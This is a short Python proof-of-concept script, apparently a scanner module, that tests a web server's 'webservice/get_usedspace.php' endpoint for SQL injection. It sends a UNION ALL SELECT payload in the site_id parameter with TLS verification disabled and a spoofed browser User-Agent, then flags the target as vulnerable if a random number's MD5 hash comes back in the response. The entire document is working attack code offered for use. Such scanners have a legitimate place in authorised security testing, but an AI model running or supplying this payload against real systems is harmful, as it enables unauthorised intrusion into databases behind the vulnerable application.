import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
a1=randomInt(200, 900)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"webservice/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20md5("+str(a1)+")--"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if md5(str(a1).encode()).hexdigest() in response.text:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
